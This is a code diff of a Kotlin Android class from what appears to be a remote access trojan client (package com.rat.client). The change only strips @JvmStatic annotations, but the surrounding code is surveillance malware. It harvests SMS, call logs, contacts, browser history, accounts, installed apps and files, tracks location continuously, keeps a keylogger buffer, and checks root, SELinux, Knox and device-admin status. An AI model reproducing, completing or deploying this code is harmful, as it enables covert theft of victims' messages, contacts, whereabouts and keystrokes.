@@ -66,7 +66,7 @@ class DeviceUtils private constructor() {
         private val keylogBuffer = ConcurrentHashMap<Long, String>()
         private const val MAX_KEYLOG_ENTRIES = 10000
 
-        @JvmStatic
+        
         fun init(appContext: Context) {
             context = appContext.applicationContext
         }
@@ -76,7 +76,7 @@ class DeviceUtils private constructor() {
 
         // ===== Device Info Collection =====
 
-        @JvmStatic
+        
         @SuppressLint("HardwareIds")
         fun collectDeviceInfo(context: Context): Map<String, Any> {
             val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
@@ -206,7 +206,7 @@ class DeviceUtils private constructor() {
             return info
         }
 
-        @JvmStatic
+        
         @SuppressLint("HardwareIds")
         fun getDeviceId(context: Context): String {
             val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
@@ -236,7 +236,7 @@ class DeviceUtils private constructor() {
 
         // ===== SMS =====
 
-        @JvmStatic
+        
         fun getSmsData(context: Context, limit: Int = 100, offset: Int = 0): Map<String, Any> {
             val uri = Uri.parse("content://sms")
             val projection = arrayOf("_id", "address", "body", "date", "type", "read", "thread_id", "protocol")
@@ -282,7 +282,7 @@ class DeviceUtils private constructor() {
 
         // ===== Call Logs =====
 
-        @JvmStatic
+        
         fun getCallLogData(context: Context, limit: Int = 100): Map<String, Any> {
             val uri = CallLog.Calls.CONTENT_URI
             val projection = arrayOf(
@@ -338,7 +338,7 @@ class DeviceUtils private constructor() {
 
         // ===== Contacts =====
 
-        @JvmStatic
+        
         fun getContactsData(context: Context, limit: Int = 500): Map<String, Any> {
             val uri = ContactsContract.Contacts.CONTENT_URI
             val projection = arrayOf(
@@ -449,7 +449,7 @@ class DeviceUtils private constructor() {
 
         // ===== Location =====
 
-        @JvmStatic
+        
         fun getLastKnownLocation(context: Context): Map<String, Any>? {
             val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
             val providers = locationManager.getProviders(true)
@@ -486,7 +486,7 @@ class DeviceUtils private constructor() {
             }
         }
 
-        @JvmStatic
+        
         fun startLocationTracking(context: Context, intervalMs: Long = 60000) {
             if (isTrackingLocation.getAndSet(true)) return
 
@@ -527,7 +527,7 @@ class DeviceUtils private constructor() {
             }
         }
 
-        @JvmStatic
+        
         fun stopLocationTracking(context: Context) {
             if (!isTrackingLocation.getAndSet(false)) return
             val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
@@ -537,7 +537,7 @@ class DeviceUtils private constructor() {
             locationListeners.clear()
         }
 
-        @JvmStatic
+        
         fun getLocationHistory(context: Context): Map<String, Any> {
             // Would read from local database
             return mapOf("history" to emptyList<Map<String, Any>>())
@@ -545,7 +545,7 @@ class DeviceUtils private constructor() {
 
         // ===== Apps =====
 
-        @JvmStatic
+        
         fun getInstalledApps(context: Context, includeSystem: Boolean = false): Map<String, Any> {
             val pm = context.packageManager
             val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
@@ -587,7 +587,7 @@ class DeviceUtils private constructor() {
             return mapOf("apps" to appsList, "count" to appsList.size)
         }
 
-        @JvmStatic
+        
         fun getAppData(context: Context, packageName: String): Map<String, Any> {
             val pm = context.packageManager
             return try {
@@ -618,7 +618,7 @@ class DeviceUtils private constructor() {
 
         // ===== Files =====
 
-        @JvmStatic
+        
         fun getInterestingFiles(context: Context): Map<String, Any> {
             val interestingPaths = listOf(
                 Environment.getExternalStorageDirectory().absolutePath,
@@ -645,13 +645,13 @@ class DeviceUtils private constructor() {
 
         // ===== Battery =====
 
-        @JvmStatic
+        
         fun getBatteryLevel(context: Context): Int {
             val intent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
             return intent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
         }
 
-        @JvmStatic
+        
         fun getBatteryInfo(context: Context): Map<String, Any> {
             val intent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
             return if (intent != null) {
@@ -704,7 +704,7 @@ class DeviceUtils private constructor() {
 
         // ===== Network Type =====
 
-        @JvmStatic
+        
         fun getNetworkType(context: Context): String {
             val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
             val activeNetwork = cm.activeNetwork
@@ -720,7 +720,7 @@ class DeviceUtils private constructor() {
 
         // ===== Bluetooth =====
 
-        @JvmStatic
+        
         fun scanBluetooth(context: Context): Map<String, Any> {
             val adapter = BluetoothAdapter.getDefaultAdapter()
             if (adapter == null) return mapOf("error" to "No Bluetooth adapter")
@@ -745,7 +745,7 @@ class DeviceUtils private constructor() {
             return mapOf("devices" to devices, "count" to devices.size, "discovering" to adapter.isDiscovering)
         }
 
-        @JvmStatic
+        
         fun pairBluetooth(context: Context, address: String): Map<String, Any> {
             val adapter = BluetoothAdapter.getDefaultAdapter()
             if (adapter == null) return mapOf("error" to "No Bluetooth adapter")
@@ -762,7 +762,7 @@ class DeviceUtils private constructor() {
 
         // ===== NFC =====
 
-        @JvmStatic
+        
         fun readNfc(context: Context): Map<String, Any> {
             val adapter = NfcAdapter.getDefaultAdapter(context)
             if (adapter == null) return mapOf("error" to "No NFC adapter")
@@ -770,7 +770,7 @@ class DeviceUtils private constructor() {
             return mapOf("available" to adapter.isEnabled)
         }
 
-        @JvmStatic
+        
         fun writeNfc(context: Context, data: String): Map<String, Any> {
             val adapter = NfcAdapter.getDefaultAdapter(context)
             if (adapter == null) return mapOf("error" to "No NFC adapter")
@@ -779,7 +779,7 @@ class DeviceUtils private constructor() {
 
         // ===== Browser =====
 
-        @JvmStatic
+        
         fun getBrowserHistory(context: Context): Map<String, Any> {
             val history = mutableListOf<Map<String, Any>>()
             val projection = arrayOf(
@@ -806,7 +806,7 @@ class DeviceUtils private constructor() {
             return mapOf("history" to history, "count" to history.size)
         }
 
-        @JvmStatic
+        
         fun getBookmarks(context: Context): Map<String, Any> {
             val bookmarks = mutableListOf<Map<String, Any>>()
             val projection = arrayOf(
@@ -833,7 +833,7 @@ class DeviceUtils private constructor() {
 
         // ===== Accounts =====
 
-        @JvmStatic
+        
         fun getAccounts(context: Context): Map<String, Any> {
             val accounts = mutableListOf<Map<String, Any>>()
             val accountManager = android.accounts.AccountManager.get(context)
@@ -849,7 +849,7 @@ class DeviceUtils private constructor() {
 
         // ===== Notifications =====
 
-        @JvmStatic
+        
         fun getNotifications(context: Context): Map<String, Any> {
             // Requires NotificationListenerService
             return mapOf("notifications" to emptyList<Map<String, Any>>(), "count" to 0)
@@ -857,7 +857,7 @@ class DeviceUtils private constructor() {
 
         // ===== Keylogger =====
 
-        @JvmStatic
+        
         fun addKeylog(text: String) {
             if (keylogBuffer.size >= MAX_KEYLOG_ENTRIES) {
                 val oldestKey = keylogBuffer.keys.minOrNull()
@@ -866,7 +866,7 @@ class DeviceUtils private constructor() {
             keylogBuffer[System.currentTimeMillis()] = text
         }
 
-        @JvmStatic
+        
         fun getKeylogs(context: Context): Map<String, Any> {
             val logs = keylogBuffer.entries.map { (time, text) ->
                 mapOf("time" to time, "text" to text)
@@ -877,7 +877,7 @@ class DeviceUtils private constructor() {
 
         // ===== Root Detection =====
 
-        @JvmStatic
+        
         fun isDeviceRooted(): Boolean {
             val rootPaths = listOf(
                 "/system/app/Superuser.apk",
@@ -895,7 +895,7 @@ class DeviceUtils private constructor() {
             return rootPaths.any { File(it).exists() }
         }
 
-        @JvmStatic
+        
         fun getSelinuxStatus(): String {
             return try {
                 Runtime.getRuntime().exec("getenforce").inputStream.bufferedReader().readLine() ?: "Unknown"
@@ -904,7 +904,7 @@ class DeviceUtils private constructor() {
             }
         }
 
-        @JvmStatic
+        
         fun getKnoxStatus(context: Context): String {
             return try {
                 val knox = Class.forName("com.samsung.android.knox.SemPersonaManager")
@@ -916,14 +916,14 @@ class DeviceUtils private constructor() {
             }
         }
 
-        @JvmStatic
+        
         fun isDeviceAdminActive(context: Context): Boolean {
             val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
             val adminComponent = ComponentName(context, com.rat.client.receiver.DeviceAdminReceiverImpl::class.java)
             return dpm.isAdminActive(adminComponent)
         }
 
-        @JvmStatic
+        
         fun getGrantedPermissions(context: Context): List<String> {
             val pm = context.packageManager
             val pkgInfo = try {
@@ -936,7 +936,7 @@ class DeviceUtils private constructor() {
             } ?: emptyList()
         }
 
-        @JvmStatic
+        
         fun getRadioVersion(): String {
             return try {
                 val prop = System.getProperty("gsm.version.baseband")
